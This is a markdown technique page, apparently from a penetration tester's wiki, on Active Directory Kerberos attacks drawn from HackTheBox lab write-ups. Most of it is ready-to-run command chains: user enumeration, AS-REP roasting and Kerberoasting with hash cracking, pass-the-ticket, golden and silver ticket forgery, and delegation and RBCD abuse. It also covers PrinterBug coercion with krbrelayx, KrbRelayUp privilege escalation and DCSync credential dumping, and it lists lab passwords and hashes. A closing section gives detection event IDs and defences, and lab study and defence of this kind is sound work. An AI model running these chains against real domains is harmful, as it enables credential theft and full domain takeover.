---
title: "Kerberos Attacks"
type: technique
tags:
  - kerberos
  - active-directory
  - windows
  - kerberoasting
  - asrep-roasting
  - golden-ticket
  - silver-ticket
  - delegation
  - rbcd
  - pass-the-ticket
  - dcsync
phase: post-exploitation
date_created: 2026-05-13
date_updated: 2026-07-14
sources: [0xdf-kerberos, hacktricks-network]
---

# Kerberos Attacks

## What it is

**Kerberos** is the default authentication protocol for Windows Active Directory. It issues ticket-granting tickets (TGTs) and service tickets (TGS tickets) so that users authenticate once and then access services without transmitting their password over the network. Because tickets are encrypted with account hashes and the KDC acts as a trusted third party, any compromise of a hash, delegation configuration, or TGT material translates directly into lateral movement or privilege escalation.

---

## How it works

The Kerberos flow has three steps:

1. **AS-REQ / AS-REP** — The client sends an AS-REQ to the KDC (Key Distribution Center, i.e. the DC). If pre-authentication succeeds (the client proves it knows the account's hash), the KDC returns an AS-REP containing a **TGT** encrypted with the krbtgt account hash plus a session key encrypted with the client's hash.
2. **TGS-REQ / TGS-REP** — The client presents the TGT to request a **TGS** (service ticket) for a specific SPN. The KDC returns a TGS encrypted with the service account's hash.
3. **AP-REQ** — The client presents the TGS to the service, which decrypts it with its own hash to authenticate the client.

Each of these three steps is an attack surface:
- Step 1 (AS-REP): intercept the hash-encrypted session key if pre-auth is disabled (AS-REP Roasting).
- Step 2 (TGS): intercept the service-account-encrypted ticket and crack offline (Kerberoasting).
- Ticket material: if you have the krbtgt hash, forge TGTs (Golden Ticket); if you have a service hash, forge TGS tickets (Silver Ticket).

---

## Attack phases

These attacks span multiple pentest phases:
- **Enumeration** — Kerbrute username validation; AS-REP Roasting (no creds required).
- **Exploitation** — Kerberoasting with any domain user; delegation abuse; relay attacks.
- **Post-exploitation** — Golden/Silver Ticket; PtT after obtaining hashes; DCSync.

---

## Prerequisites

| Attack | Minimum Requirement |
|--------|---------------------|
| Kerbrute enumeration | Network access to port 88 |
| AS-REP Roasting | List of usernames; target must have `DONT_REQUIRE_PREAUTH` set |
| Kerberoasting | Any valid domain user credentials (or a `DONT_REQUIRE_PREAUTH` account — see Rebound below) |
| Pass-the-Ticket | Access to LSASS or existing `.kirbi`/`.ccache` file |
| Golden Ticket | krbtgt NTLM hash (usually via DCSync); domain SID |
| Silver Ticket | Service account NTLM hash; domain SID; target SPN |
| Unconstrained Delegation | Compromised account or computer with `TrustedForDelegation` set |
| Constrained Delegation | Compromised account with `msDS-AllowedToDelegateTo` configured |
| RBCD | Write access to a target computer's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute; a machine account you control |
| Kerberos Relay | Local code execution; no LDAP signing/channel binding enforced (or ADCS ESC8 path) |

---

## Kerbrute — username enumeration

**Kerbrute** validates domain usernames by sending AS-REQ packets and observing KDC error codes. `PRINCIPAL_UNKNOWN` means the user does not exist; `WRONG_PASSWORD` or `PREAUTH_REQUIRED` confirms the user is valid. No password needed and no lockout by default.

```bash
# Validate a wordlist against a domain (Sauna, APT)
kerbrute userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.175

# From a 2,000-entry NTDS extract (APT)
kerbrute userenum -d apt.htb --dc apt.htb users
```

Output lists valid usernames for feeding into roasting and spray attacks. See [[ad-enumeration]] for generating username wordlists from LDAP and RID cycling with [[netexec]].

---

## AS-REP Roasting

When a domain account has `UF_DONT_REQUIRE_PREAUTH` set, the KDC will issue an AS-REP without the client proving it knows the password. The AS-REP contains a session key encrypted with the user's NTLM hash. This encrypted blob can be captured without credentials and cracked offline.

### Get hashes

```bash
# Impacket — supply a wordlist of usernames, no creds required (Forest, Sauna, Blackfield)
GetNPUsers.py DOMAIN/ -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip <IP>

# Single account probe (Forest)
GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/svc-alfresco

# netexec — test a user list (Rebound)
netexec ldap <IP> -u users.txt -p '' --asreproast asrephashes.txt
```

### Crack

```bash
# RC4 (etype 23) — hashcat mode 18200
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# Rules for harder passwords
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### HTB examples

| Machine | User | Password |
|---------|------|----------|
| Forest | svc-alfresco | s3rvice |
| Sauna | fsmith | Thestrokes23 |
| Blackfield | support | #00^BlackKnight |
| Rebound | jjones | (hash did not crack; used for Kerberoast-without-preauth) |

---

## Kerberoasting

Any authenticated domain user can request a TGS for any registered SPN. The TGS is encrypted with the service account's NTLM hash and can be cracked offline. High-value targets are service accounts running as domain users with weak passwords.

### Standard Kerberoasting

```bash
# Impacket — request all TGS tickets for SPN accounts (Delegate, Object)
GetUserSPNs.py DOMAIN/user:pass -dc-ip <IP> -request -outputfile tgs_hashes.txt

# Filter to a specific account
GetUserSPNs.py DOMAIN/user:pass -dc-ip <IP> -request-user svc_mssql

# netexec
netexec ldap <IP> -u user -p pass --kerberoasting kerberoast.txt
```

### Kerberoasting without credentials (Rebound)

If any account has `DONT_REQUIRE_PREAUTH`, use it as a proxy to request TGS tickets for SPN accounts without valid creds:

```bash
# -no-preauth specifies the account that has DONT_REQUIRE_PREAUTH (Rebound)
GetUserSPNs.py -no-preauth jjones -usersfile users -dc-host 10.10.11.231 rebound.htb/

# Save only the hashes
GetUserSPNs.py -no-preauth jjones -usersfile users -dc-host 10.10.11.231 rebound.htb/ | grep '^\$krb' > kerberoasting_hashes
```

### Targeted Kerberoasting (GenericWrite ACL, Object)

If you have `GenericWrite` on an account, add a dummy SPN, Kerberoast it, then remove it:

```powershell
# PowerView — add SPN to target (Object — maria)
Set-DomainObject -Identity maria -Set @{serviceprincipalname='nonexistent/0xdf'}

# Request the TGS
Get-DomainSPNTicket -SPN "nonexistent/0xdf" | Select-Object -ExpandProperty Hash

# Clean up
Set-DomainObject -Identity maria -Clear serviceprincipalname
```

### Crack

```bash
# RC4 (etype 23) — mode 13100
hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt

# AES256 (etype 18) — mode 19600
hashcat -m 19600 tgs_hashes.txt /usr/share/wordlists/rockyou.txt

# AES128 (etype 17) — mode 19800
hashcat -m 19800 tgs_hashes.txt /usr/share/wordlists/rockyou.txt
```

See [[password-cracking]] for advanced rules and mask attacks. See [[ad-enumeration]] for the basic enumeration workflow.

---

## Pass-the-Ticket (PtT)

**Pass-the-Ticket** injects a TGT or TGS into the current session. Unlike Pass-the-Hash, it requires the actual ticket (`.kirbi` on Windows, `.ccache` on Linux), not just the NT hash. The technique is documented in depth at [[pass-the-hash]]; key commands are:

```bash
# Windows — export all tickets from LSASS (requires admin)
mimikatz # sekurlsa::tickets /export

# Inject a specific ticket
mimikatz # kerberos::ptt [ticket].kirbi

# Rubeus — dump all tickets (no admin required for current user tickets)
Rubeus.exe dump /nowrap

# Rubeus — inject
Rubeus.exe ptt /ticket:<base64>

# Linux — set the ticket path and use Impacket tools
export KRB5CCNAME=/path/to/ticket.ccache
secretsdump.py -k -no-pass DOMAIN/user@dc.domain.local

# Convert between formats
ticketConverter.py ticket.kirbi ticket.ccache
```

See [[pass-the-hash]] for Shadow Credentials (pywhisker), Overpass-the-Hash, and keytab-based authentication.

---

## Golden Ticket

A **Golden Ticket** is a forged TGT signed with the krbtgt account's NTLM hash. Because all TGTs in the domain are verified against the krbtgt hash, a forged TGT is unconditionally trusted by every service. The ticket can be crafted for any user and any group membership (including Domain Admins). This is primarily a persistence technique since it requires the krbtgt hash upfront.

### Obtain krbtgt hash

```bash
# DCSync from Linux (requires DS-Replication-Get-Changes-All)
secretsdump.py DOMAIN/user:pass@dc.domain.local

# DCSync from Windows — Mimikatz
mimikatz # lsadump::dcsync /domain:DOMAIN.LOCAL /user:krbtgt

# Dump after ACL abuse — Forest
# (add DCSync rights via Add-DomainObjectAcl, then:)
secretsdump.py svc-alfresco:s3rvice@10.10.10.161
# Result: 819af826bb148e603acb0f33d17632f8
```

### Forge and inject

```bash
# Mimikatz — Golden Ticket
mimikatz # kerberos::golden /domain:DOMAIN.LOCAL /sid:S-1-5-21-... /rc4:<krbtgt_hash> /user:Administrator /id:500 /ptt

# Mimikatz — write to disk
mimikatz # kerberos::golden /domain:DOMAIN.LOCAL /sid:S-1-5-21-... /rc4:<krbtgt_hash> /user:Administrator /id:500 /ticket:golden.kirbi

# Impacket — ticketer.py (Linux)
ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain DOMAIN.LOCAL Administrator

export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass DOMAIN.LOCAL/Administrator@dc.domain.local
```

Note: After a password reset of krbtgt, existing Golden Tickets are invalidated. Two resets (24+ hours apart) are required to fully rotate the secret.

---

## Silver Ticket

A **Silver Ticket** is a forged TGS for a specific service, signed with the service account's hash. Unlike a Golden Ticket, no DC interaction occurs during authentication — the service itself decrypts the ticket. This makes Silver Tickets stealthier but limited to the specific service.

```bash
# Mimikatz — Silver Ticket for CIFS (file share)
mimikatz # kerberos::golden /domain:DOMAIN.LOCAL /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:<service_account_hash> /user:Administrator /ptt

# Common services: cifs, http, mssql, host, rpcss, wsman
# Impacket — ticketer.py
ticketer.py -nthash <service_hash> -domain-sid S-1-5-21-... -domain DOMAIN.LOCAL -spn MSSQLSvc/db.domain.local:1433 Administrator
export KRB5CCNAME=Administrator.ccache
mssqlclient.py -k -no-pass DOMAIN.LOCAL/Administrator@db.domain.local
```

**HTB: Intelligence** — the GMSA service account had constrained delegation; the machine account hash was used to forge a service ticket for the DC, then DCSync was triggered.

**HTB: Scrambled** — NTLM was disabled domain-wide. After Kerberoasting the `SqlSvc` account, a Silver Ticket was forged for `MSSQLSvc` to authenticate to the MSSQL service without NTLM.

---

## Unconstrained Delegation

When a computer or service account has `TrustedForDelegation` set (unconstrained delegation), any user who authenticates to it sends their full TGT along with the TGS. The server can then impersonate that user against any service. If an attacker compromises an unconstrained delegation host and coerces DC authentication (e.g. via PrinterBug or PetitPotam), they capture the DC's machine account TGT and can perform DCSync.

### Enumerate

```powershell
# PowerView
Get-DomainComputer -Unconstrained -Properties DnsHostName

# Impacket
findDelegation.py DOMAIN/user:pass -dc-ip <IP>
```

### Abuse with coercion (Delegate machine)

```bash
# Step 1: create a machine account (requires SeEnableDelegationPrivilege or MachineAccountQuota)
addcomputer.py -computer-name oxdf -computer-pass 'P@ssw0rd' -dc-ip <IP> DOMAIN/user:pass

# Step 2: add an SPN so krbrelayx can find the ticket
addspn.py -u DOMAIN\\user -p pass -s HOST/oxdf.domain.local -dc-ip <IP> dc.domain.local --additional

# Step 3: enable unconstrained delegation on the machine account
bloodyAD -u user -p pass -d DOMAIN --host dc.domain.local add uac 'oxdf$' -f TRUSTED_FOR_DELEGATION

# Step 4: start krbrelayx to capture incoming TGTs
krbrelayx.py -hashes :02cb8258df07966e32677128e5ff1d26

# Step 5: coerce DC$ to authenticate to your host (PrinterBug)
printerbug.py DOMAIN/user:pass@dc.domain.local oxdf.domain.local

# Step 6: krbrelayx captures DC1$@DOMAIN.ccache; use it for DCSync
KRB5CCNAME=DC1$@DOMAIN.ccache netexec smb dc.domain.local --use-kcache --ntds
```

---

## Constrained Delegation

**Constrained Delegation** restricts which services an account can impersonate other users to, configured via `msDS-AllowedToDelegateTo`. The **S4U2Self** extension lets the service request a TGS for any user to itself; **S4U2Proxy** uses that ticket to request a TGS for the target service. Together they allow full impersonation of any user (including Domain Admins) to the listed services without knowing the user's password.

### Enumerate

```powershell
Get-DomainUser -TrustedToAuth -Properties DnsHostName, msDS-AllowedToDelegateTo
Get-DomainComputer -TrustedToAuth -Properties DnsHostName, msDS-AllowedToDelegateTo
```

```bash
findDelegation.py DOMAIN/user:pass -dc-ip <IP>
```

### Exploit

```bash
# Impacket getST.py — S4U2Self + S4U2Proxy, impersonate Administrator
getST.py -spn cifs/dc.domain.local -impersonate Administrator -dc-ip <IP> DOMAIN/svc_account:pass

export KRB5CCNAME=Administrator@cifs_dc.domain.local@DOMAIN.ccache
secretsdump.py -k -no-pass DOMAIN/Administrator@dc.domain.local

# Rubeus
Rubeus.exe s4u /user:svc_account /password:pass /impersonateuser:Administrator /msdsspn:cifs/dc.domain.local /ptt
```

**HTB: Rebound** — the `delegator$` GMSA account had constrained delegation. Combined with RBCD it allowed impersonating DC01$ to perform DCSync.

**HTB: Intelligence** — the GMSA service account (`svc_int$`) had `AllowedToDelegateTo` pointing to the DC. After reading the GMSA password, getST.py was used to impersonate Administrator.

---

## Resource-Based Constrained Delegation (RBCD)

**RBCD** inverts the delegation model: instead of the front-end service being trusted to delegate, the target resource specifies which accounts are allowed to impersonate users to it. This is configured via the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the target computer object. If you have write access to a target computer (e.g. via `GenericAll`, `GenericWrite`, or `WriteProperty` on the computer object), you can configure RBCD from a machine account you control and impersonate any domain user to that computer.

### Full attack chain (Support machine)

```powershell
# Step 1: create a fake machine account (requires MachineAccountQuota >= 1; default is 10)
# Powermad
New-MachineAccount -MachineAccount 0xdfFakeComputer -Password $(ConvertTo-SecureString '0xdf0xdf123' -AsPlainText -Force)

# Step 2: get the NTLM hash of the new machine account for Rubeus
# (B1809AB221A7E1F4545BD9E24E49D5F4 in Support example)

# Step 3: write msDS-AllowedToActOnBehalfOfOtherIdentity on the target computer
# PowerView
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$(Get-DomainComputer 0xdfFakeComputer -Properties objectsid | Select-Object -Expand objectsid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Set-DomainObject -Identity dc -Set @{'msds-allowedtoactonbehalfofotheridentity' = $SDBytes}
```

```bash
# Step 4: Rubeus S4U to get a service ticket for Administrator on the target (Support)
Rubeus.exe s4u /user:0xdfFakeComputer$ /rc4:B1809AB221A7E1F4545BD9E24E49D5F4 /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt

# Step 5 (Linux path): convert the ticket and use psexec
ticketConverter.py ticket.kirbi ticket.ccache
KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass

# Linux end-to-end with impacket
rbcd.py -f 0xdfFakeComputer -t dc -dc-ip <IP> DOMAIN/user:pass
getST.py -spn cifs/dc.domain.local -impersonate Administrator -dc-ip <IP> DOMAIN/'0xdfFakeComputer$':pass
export KRB5CCNAME=Administrator@cifs_dc.domain.local@DOMAIN.ccache
secretsdump.py -k -no-pass DOMAIN/Administrator@dc.domain.local
```

**HTB: Support** — RBCD was the path from the `support` user (which had `GenericAll` on the DC object) to Domain Admin. The attack used Powermad + PowerView + Rubeus on Windows.

**HTB: Rebound** — constrained delegation combined with RBCD to impersonate DC01$ and perform DCSync.

---

## Kerberos Relay (KrbRelayUp / KrbRelay)

**KrbRelayUp** is a local privilege escalation technique. When LDAP signing and channel binding are not enforced, a low-privileged user can coerce a local machine-to-machine Kerberos relay, create a RBCD entry, and then use S4U2Self + S4U2Proxy to obtain a service ticket as SYSTEM.

The `KrbRelay` project extends this to cross-session relay attacks. Combined with ADCS ESC8 (HTTP endpoint that accepts Kerberos authentication), the relayed ticket can be used to enroll a certificate for a privileged account. See [[adcs]] for the ESC8 chain.

```bash
# KrbRelayUp — all-in-one local privesc (Absolute)
KrbRelayUp.exe relay -m rbcd -p 12345
KrbRelayUp.exe krbsc -m rbcd -cn KRBRELAYUP$ -cp Password123 -p 12345

# RemotePotato0 / KrbRelay — cross-session relay (Rebound)
# Requires two sessions: one to start the relay, one to trigger auth
RemotePotato0.exe -m 0 -r <attacker_ip> -x <attacker_ip> -p 9999 -s <victim_session_id>
```

---

## DCSync

**DCSync** abuses the Directory Replication Service protocol. Any principal with `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` rights can request password hashes for any account, including krbtgt and Administrator, without touching LSASS on the DC.

### Required rights

By default: Domain Admins, Enterprise Admins, Domain Controllers. Attackers often reach DCSync via ACL abuse (Forest — svc-alfresco was granted DCSync rights via `Add-DomainObjectAcl`).

### Commands

```bash
# secretsdump.py (Sauna, Forest, Blackfield)
secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
secretsdump.py svc-alfresco:s3rvice@10.10.10.161

# With Kerberos ticket (Delegate)
KRB5CCNAME=DC1$.ccache secretsdump.py -k -no-pass DELEGATE.VL/DC1$@dc1.delegate.vl

# Mimikatz
mimikatz # lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:administrator
```

```powershell
# PowerView — grant DCSync rights to controlled user (Forest — ACL abuse path)
$UserSID = (Get-DomainUser user -Properties objectsid).objectsid
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity user -Rights DCSync
```

See [[ad-persistence]] for Skeleton Key and DSRM as alternative persistence paths that also require DC access.

---

## Kerberos-only authentication from Linux (client prep and troubleshooting)

When NTLM is disabled on domain services, Linux tooling must speak Kerberos, and the
practical setup steps are the gap (the roasting/PtT attacks are already covered). Clock
skew beyond a few minutes yields KRB_AP_ERR_SKEW; NTLM attempts return
STATUS_NOT_SUPPORTED, so force Kerberos with -k. netexec can generate a working
krb5.conf.

```bash
# 1. Sync clock to the DC (skew breaks all Kerberos auth)
sudo ntpdate <dc.fqdn> || sudo chronyd -q 'server <dc.fqdn> iburst'

# 2. Generate and install a krb5.conf, then get a TGT
netexec smb <dc.fqdn> -u <user> -p '<pass>' -k --generate-krb5-file krb5.conf
sudo cp krb5.conf /etc/krb5.conf
kinit <user>; klist

# 3. Use the ccache with SMB/WinRM tooling (no passwords sent)
netexec smb <dc.fqdn> -k
smbclient --kerberos //<dc.fqdn>/IPC$
# GSSAPI SSH SSO; the FQDN must match the host SPN or you get
# "Server not found in Kerberos database"
ssh -o GSSAPIAuthentication=yes <user>@<host.fqdn>
```

Ensure /etc/hosts resolves the exact FQDN (SPN mismatches break GSSAPI).

---

## Detection and defence

### Event IDs to monitor

| Event ID | Event | Notes |
|----------|-------|-------|
| 4769 | TGS ticket request | Kerberoasting: filter on `TicketEncryptionType = 0x17` (RC4) for non-legacy systems |
| 4768 | TGT request | AS-REP Roasting: `PreAuthType = 0` means pre-auth was not required |
| 4672 | Special logon | Golden/Silver Ticket: logon with sensitive privileges, no corresponding 4768 |
| 4624 Type 3 | Network logon | PtT: Kerberos logon with no matching TGT request on the DC |
| 4662 | Object access | DCSync: check for `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (DS-Replication-Get-Changes-All) |
| 4741 | Computer account created | RBCD: machine account creation under suspicious accounts |

### Defences

- **Managed service accounts (gMSA)** — 240-bit randomly rotated passwords for service accounts; eliminates Kerberoasting on those accounts.
- **Protected Users security group** — members cannot use RC4 for Kerberos; forces AES only; disables delegation.
- **Disable DONT_REQUIRE_PREAUTH** — audit and remove the flag from all accounts not requiring it.
- **LDAP signing + channel binding** — prevents credential relay to LDAP; defeats many relay-based RBCD attacks.
- **Tiered administration** — limit which accounts have DCSync rights; monitor membership in replication-privileged groups.
- **Credential Guard** — prevents LSASS memory access; blocks ticket export via Mimikatz `sekurlsa`.
- **krbtgt password rotation** — rotate the krbtgt password twice (24 hours apart) to invalidate Golden Tickets.

---

## Tools

| Tool | Purpose |
|------|---------|
| [[netexec]] | AS-REP Roasting (`--asreproast`), Kerberoasting (`--kerberoasting`), RID cycling for userlist |
| [[certipy]] | ADCS enumeration and exploitation; Kerberos relay chains |
| Impacket `GetNPUsers.py` | AS-REP Roasting |
| Impacket `GetUserSPNs.py` | Kerberoasting; `-no-preauth` mode for credless Kerberoast |
| Impacket `getST.py` | S4U2Self + S4U2Proxy for constrained delegation and RBCD |
| Impacket `ticketer.py` | Forge Golden / Silver tickets from hash + domain SID |
| Impacket `secretsdump.py` | DCSync; credential extraction |
| Rubeus | AS-REP Roast, Kerberoast, S4U, dump/ptt, RBCD — see [[pass-the-hash]] |
| Mimikatz | sekurlsa::tickets, kerberos::golden, kerberos::ptt, lsadump::dcsync |
| Kerbrute | Username enumeration via Kerberos pre-auth probing |
| krbrelayx | Unconstrained delegation abuse; TGT capture from coerced auth |
| KrbRelayUp | Local privilege escalation via RBCD relay |
| bloodyAD | Python AD tool; set UAC flags, write ACLs, enable delegation |
| Powermad | PowerShell; create machine accounts (RBCD prerequisite) |

---

## Sources

Derived from 0xdf HackTheBox writeups covering Kerberos-heavy machines:

| Machine | Key Techniques |
|---------|---------------|
| Forest | AS-REP Roasting (svc-alfresco); ACL-based DCSync |
| Sauna | Kerbrute; AS-REP Roasting (fsmith); DCSync |
| Blackfield | AS-REP Roasting (support); BloodHound ACL chain |
| Rebound | Kerberoast-without-preauth; constrained delegation + RBCD; cross-session relay |
| Support | RBCD full chain via GenericAll on DC |
| Delegate | Unconstrained delegation + PrinterBug coercion + krbrelayx |
| Object | Targeted Kerberoast via GenericWrite; ForceChangePassword ACL chain |
| Intelligence | Constrained delegation via GMSA; Silver Ticket for MSSQL |
| Scrambled | Silver Ticket (NTLM disabled domain-wide) |
| APT | Kerbrute at scale; Kerberos hash brute from NTDS backup |

Cross-references: [[ad-enumeration]], [[ad-lateral-movement]], [[pass-the-hash]], [[ad-persistence]], [[password-cracking]], [[netexec]], [[certipy]], [[adcs]]

## Wired sub-techniques

<!-- auto-wired: context-reachable sub-technique pages -->
- [[active-directory-tricks]]
- [[forest-to-forest-compromise-trust-ticket]]
- [[hash-overpass-the-hash]]
- [[hash-pass-the-key]]
- [[internal-kerberos-relay]]
- [[kerberos-bronze-bit]]
- [[kerberos-delegation-constrained-delegation]]
- [[kerberos-delegation-resource-based-constrained-delegation]]
- [[kerberos-delegation-unconstrained-delegation]]
- [[kerberos-service-for-user-extension]]
- [[kerberos-tickets]]
- [[ms14-068-checksum-validation]]
- [[roasting-timeroasting]]
